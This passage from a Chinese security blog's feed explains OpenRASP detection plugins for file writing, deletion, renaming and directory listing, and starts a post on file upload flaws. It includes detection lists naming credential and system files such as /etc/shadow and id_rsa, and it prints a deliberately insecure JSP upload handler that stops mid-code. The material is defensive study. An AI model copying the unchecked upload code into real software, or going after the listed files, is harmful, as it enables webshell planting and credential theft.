class="regexp">/\.(do[c|t][x|m|]?|xl[s|t][x|m|b]?|pp[t|s|a][x|m]?|pot[x|m]|7z|tar|gz|bz2|xz|rar|zip|jpg|jpeg|png|gif|bmp|txt|)$/</span>, <span class="string">&#x27;i&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="任意文件写入–检测算法"><a href="#任意文件写入–检测算法" class="headerlink" title="任意文件写入–检测算法"></a>任意文件写入–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写文件操作 - NTFS 流</span></span><br><span class="line"><span class="attr">writeFile_NTFS</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 拦截 NTFS ::$DATA 写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 写文件操作 - PUT 上传脚本文件 - 无法关联实际上传的文件和写文件操作，暂时注释掉</span></span><br><span class="line"><span class="comment">// writeFile_PUT_script: &#123;</span></span><br><span class="line"><span class="comment">//     name:   &#x27;算法2 - 拦截 PUT 方式上传 php/jsp 等脚本文件&#x27;,</span></span><br><span class="line"><span class="comment">//     action: &#x27;block&#x27;</span></span><br><span class="line"><span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写文件操作 - 脚本文件</span></span><br><span class="line"><span class="comment">// https://rasp.baidu.com/doc/dev/official.html#case-file-write</span></span><br><span class="line"><span class="attr">writeFile_script</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法2 - 拦截 php/jsp 等脚本文件的写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-file-write&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">userinput</span>:  <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">lcs_search</span>: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="attr">writeFile_reflect</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法3 - 拦截通过反射、反序列化执行的文件写入操作&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;writeFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写 NTFS 流文件，通常是为了绕过限制</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_NTFS</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ntfsRegex.<span class="title function_">test</span>(params.<span class="property">realpath</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_NTFS</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File write - Writing NTFS alternative data streams&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_NTFS&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PUT 上传脚本文件 - 有个关联问题需要解决，暂时注释掉</span></span><br><span class="line">    <span class="comment">// if (context.method == &#x27;put&#x27; &amp;&amp;</span></span><br><span class="line">    <span class="comment">//     algorithmConfig.writeFile_PUT_script.action != &#x27;ignore&#x27;)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if (scriptFileRegex.test(params.realpath))</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         return &#123;</span></span><br><span class="line">    <span class="comment">//             action:     algorithmConfig.writeFile_PUT_script.action,</span></span><br><span class="line">    <span class="comment">//             message:    _(&quot;File upload - Using HTTP PUT method to upload a webshell&quot;, [params.realpath]),</span></span><br><span class="line">    <span class="comment">//             confidence: 95,</span></span><br><span class="line">    <span class="comment">//             algorithm:  &#x27;writeFile_PUT_script&#x27;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关于这个算法，请参考这个插件定制文档</span></span><br><span class="line">    <span class="comment">// https://rasp.baidu.com/doc/dev/official.html#case-file-write</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">            <span class="keyword">var</span> is_win = context.<span class="property">server</span>.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">realpath</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">userinput</span>) ||</span><br><span class="line">                    ((algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">userinput</span>) &amp;&amp;</span><br><span class="line">                     (<span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">lcs_search</span>)))</span><br><span class="line">                   ) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_script</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File write - Creating or appending to a server-side script file, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_script&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">writeFile_reflect</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.<span class="property">server</span>.<span class="property">language</span> == <span class="string">&#x27;java&#x27;</span> &amp;&amp;</span><br><span class="line">            (params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.jsp&quot;</span>) || params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.jspx&quot;</span>))</span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">var</span> message = <span class="title function_">validate_stack_java</span>(params.<span class="property">stack</span>)</span><br><span class="line">                <span class="keyword">if</span> (message) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">writeFile_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Reflect file write - %1%, file is %2%&quot;</span>, [message, params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;writeFile_reflect&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 其他的 stream 都没啥用</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br></pre></td></tr></table></figure><h3 id="任意文件删除–检测算法"><a href="#任意文件删除–检测算法" class="headerlink" title="任意文件删除–检测算法"></a>任意文件删除–检测算法</h3><p>1.控制变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 任意文件删除 - 使用 ../跳出目录</span><br><span class="line">    deleteFile_userinput: &#123;</span><br><span class="line">        name:      &#x27;算法1 - 用户输入匹配，禁止使用 ../ 删除文件&#x27;,</span><br><span class="line">        action:    &#x27;block&#x27;,</span><br><span class="line">        lcs_search: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;deleteFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">        <span class="keyword">var</span> is_win = context.<span class="property">server</span>.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">lcs_search</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">deleteFile_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File delete - Deleting files specified by userinput, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">85</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;deleteFile_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="文件重命名–检测算法"><a href="#文件重命名–检测算法" class="headerlink" title="文件重命名–检测算法"></a>文件重命名–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/ 重命名监控 - 将普通文件重命名为webshell，</span><br><span class="line"><span class="comment">// 案例有 MOVE 方式上传后门、CVE-2018-9134 dedecms v5.7 后台重命名 getshell</span></span><br><span class="line">    <span class="attr">rename_webshell</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 通过重命名方式获取 WebShell&#x27;</span>,</span><br><span class="line">            <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// copy_webshell: &#123;</span></span><br><span class="line">    <span class="comment">//     action: &#x27;block&#x27;</span></span><br><span class="line">    <span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">link_webshell</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 通过链接方式获取 WebShell&#x27;</span>,</span><br><span class="line">            <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (algorithmConfig.rename_webshell.action != &#x27;ignore&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    plugin.register(&#x27;rename&#x27;, function (params, context) &#123;</span><br><span class="line">        // 目标文件在webroot内才认为是写后门</span><br><span class="line">        if (!is_outside_webroot(context.appBasePath, params.dest, null)) &#123;</span><br><span class="line">            // 源文件是干净的文件，目标文件是脚本文件，判定为重命名方式写后门</span><br><span class="line">            if (cleanFileRegex.test(params.source) &amp;&amp; scriptFileRegex.test(params.dest))</span><br><span class="line">            &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    action:    algorithmConfig.rename_webshell.action,</span><br><span class="line">                    message:   _(&quot;File upload - Renaming a non-script file to server-side script file, source file is %1%&quot;, [</span><br><span class="line">                        params.source</span><br><span class="line">                    ]),</span><br><span class="line">                    confidence: 90,</span><br><span class="line">                    algorithm:  &#x27;rename_webshell&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return clean</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常文件</span></span><br><span class="line"><span class="keyword">var</span> cleanFileRegex  = <span class="regexp">/\.(jpg|jpeg|png|gif|bmp|txt|rar|zip)$/i</span></span><br><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br></pre></td></tr></table></figure><h3 id="文件目录列出–检测算法"><a href="#文件目录列出–检测算法" class="headerlink" title="文件目录列出–检测算法"></a>文件目录列出–检测算法</h3><p>1.控制变量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件管理器 - 用户输入匹配，仅当直接读取绝对路径时才检测</span></span><br><span class="line">directory_userinput: &#123;</span><br><span class="line">    name:       <span class="string">&#x27;算法1 - 用户输入匹配算法&#x27;</span>,</span><br><span class="line">    action:     <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    lcs_search: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件管理器 - 反射方式列目录</span></span><br><span class="line">directory_reflect: &#123;</span><br><span class="line">    name:   <span class="string">&#x27;算法2 - 通过反射调用，查看目录内容&#x27;</span>,</span><br><span class="line">    action: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件管理器 - 查看敏感目录</span></span><br><span class="line">directory_unwanted: &#123;</span><br><span class="line">    name:   <span class="string">&#x27;算法3 - 尝试查看敏感目录&#x27;</span>,</span><br><span class="line">    action: <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;directory&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> realpath    = params.<span class="property">realpath</span></span><br><span class="line">    <span class="keyword">var</span> server      = context.<span class="property">server</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> is_windows  = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> language    = server.<span class="property">language</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法2 - 检查PHP菜刀等后门</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (language == <span class="string">&#x27;php&#x27;</span> &amp;&amp; <span class="title function_">validate_stack_php</span>(params.<span class="property">stack</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Using file manager function with China Chopper WebShell&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_reflect&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (language == <span class="string">&#x27;java&#x27;</span> &amp;&amp; <span class="title function_">validate_stack_java</span>(params.<span class="property">stack</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_reflect</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Using file manager function with Java WebShell&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_reflect&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法1 - 用户输入匹配。</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_path_containing_userinput</span>(all_parameter, params.<span class="property">path</span>, is_windows, algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">lcs_search</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Accessing folder specified by userinput, folder is %1%&quot;</span>, [realpath]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法3 - 读取敏感目录</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">directory_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; forcefulBrowsing.<span class="property">unwantedDirectory</span>.<span class="property">length</span>; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (realpath == forcefulBrowsing.<span class="property">unwantedDirectory</span>[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">directory_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Accessing sensitive folder: %1%&quot;</span>, [realpath]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>:  <span class="string">&#x27;directory_unwanted&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> forcefulBrowsing = &#123;</span><br><span class="line">    <span class="attr">dotFiles</span>: <span class="regexp">/\.(7z|tar|gz|bz2|xz|rar|zip|sql|db|sqlite)$/</span>,</span><br><span class="line">    <span class="attr">nonUserDirectory</span>: <span class="regexp">/^\/(proc|sys|root)/</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// webdav 文件探针 - 最常被下载的文件</span></span><br><span class="line">    <span class="attr">unwantedFilenames</span>: [</span><br><span class="line">        <span class="comment">// user files</span></span><br><span class="line">        <span class="string">&#x27;.DS_Store&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id_rsa&#x27;</span>, <span class="string">&#x27;id_rsa.pub&#x27;</span>, <span class="string">&#x27;known_hosts&#x27;</span>, <span class="string">&#x27;authorized_keys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.bash_history&#x27;</span>, <span class="string">&#x27;.csh_history&#x27;</span>, <span class="string">&#x27;.zsh_history&#x27;</span>, <span class="string">&#x27;.mysql_history&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// project files</span></span><br><span class="line">        <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;.user.ini&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;web.config&#x27;</span>, <span class="string">&#x27;web.xml&#x27;</span>, <span class="string">&#x27;build.property.xml&#x27;</span>, <span class="string">&#x27;bower.json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Gemfile&#x27;</span>, <span class="string">&#x27;Gemfile.lock&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.gitignore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;error.log&#x27;</span>, <span class="string">&#x27;nohup.out&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目录探针 - webshell 查看频次最高的目录</span></span><br><span class="line">    <span class="attr">unwantedDirectory</span>: [</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/var/log&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/private/var/log&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/proc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;C:\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;D:\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;E:\\&#x27;</span></span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件探针 - webshell 查看频次最高的文件</span></span><br><span class="line">    <span class="attr">absolutePaths</span>: [</span><br><span class="line">    <span class="string">&#x27;/etc/issue&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/etc/shadow&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/etc/passwd&#x27;</span>,</span><br><span class="line">        <span class="comment">// &#x27;/etc/hosts&#x27;,</span></span><br><span class="line">        <span class="string">&#x27;/etc/apache2/apache2.conf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/root/.bash_history&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/root/.bash_profile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c:\\windows\\system32\\inetsrv\\metabase.xml&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c:\\windows\\system32\\drivers\\etc\\hosts&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line"><span class="number">3.</span>官方文档 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP-文件上传漏洞</title>
      <link href="/2022/12/07/OpenRASP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/07/OpenRASP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-文件上传漏洞"><a href="#OpenRASP-文件上传漏洞" class="headerlink" title="OpenRASP-文件上传漏洞"></a>OpenRASP-文件上传漏洞</h1><h2 id="漏洞简介及业务代码"><a href="#漏洞简介及业务代码" class="headerlink" title="漏洞简介及业务代码"></a>漏洞简介及业务代码</h2><p>​任意文件上传漏洞的本质是在进行文件上传操作时，未对文件类型进行检测或检测功能不规范导致被绕过，从而使攻击者上传的可执行脚本（WebShell）被上传至服务器并成功解析。常见的漏洞场景有：</p><ul><li>仅前端过滤导致的任意文件上传漏洞。</li><li>后端过滤不严格导致的任意文件上传，比如indexOf取尾缀不规范，Content-Type被前端修改绕过后端匹配（如上传JSP，将原本的text&#x2F;html改为image&#x2F;jpg，后端根据Content-type进行检测）。</li></ul><h2 id="commons-fileupload-方式文件上传"><a href="#commons-fileupload-方式文件上传" class="headerlink" title="commons.fileupload 方式文件上传"></a>commons.fileupload 方式文件上传</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前端 这里是jsp表达式，如果用thymeleaf，则th:action=&quot;@&#123;/uploadoutput&#125;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;&lt;%=request.getRequestURL() %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//后端</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isMultipart</span> <span class="operator">=</span> ServletFileUpload.isMultipartContent(request);</span><br><span class="line">    <span class="keyword">if</span> (isMultipart) &#123;</span><br><span class="line">        <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">        List&lt;FileItem&gt; items = upload.parseRequest(request);</span><br><span class="line">        <span class="keyword">for</span> (FileItem item: items) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(item.get());  <span class="comment">//取出文件内容</span></span><br><span class="line">            String path;</span><br><span class="line">            <span class="type">String</span> <span class="variable">serverInfo</span> <span class="operator">=</span> application.getServerInfo();   <span class="comment">//当前服务器信息</span></span><br><span class="line">            <span class="keyword">if</span> (serverInfo != <span class="literal">null</span> &amp;&amp; serverInfo.toLowerCase().contains(<span class="string">&quot;weblogic&quot;</span>)) &#123;</span><br><span class="line">path = application.getResource(<span class="string">&quot;/&quot;</span>).getPath() + <span class="string">&quot;/&quot;</span> + item.getName();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">path = application.getRealPath(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span> + item.getName();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(os);</span><br><span class="line">writer.print(content.getBytes(<span class="string">&quot;UTF-8&quot;</span>));  <span class="comment">//将文件内容写入新路径</span></span><br><span class="line">writer.close();</span><br><span class="line">out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;写入文件 ====&gt; &quot;</span> + path);</span><br><span 